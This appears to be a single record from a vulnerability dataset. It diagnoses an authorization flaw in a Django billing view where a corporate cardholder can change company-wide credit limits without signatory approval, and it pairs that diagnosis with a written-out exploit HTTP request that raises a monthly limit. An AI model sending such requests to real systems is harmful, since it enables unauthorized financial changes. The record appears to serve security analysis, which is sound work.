diagnosis: PaymentInstrument uses django-polymorphic. If the instrument is downcast to CorporateCreditLine, the registered_user is merely an authorized cardholder, but modifications to corporate credit limits require CorporateFinancialSignatory approval. The view allows a junior employee who holds a corporate card to modify company-wide monthly credit parameters without executive authorization.
exploit_request:
POST /api/billing/instruments/INST-CORP-48102/set-limit/ HTTP/1.1
Host: payments.enterprisefin.com
Authorization: Bearer <cardholder_employee_token>
Content-Type: application/json

{"monthly_limit": 250000.00}
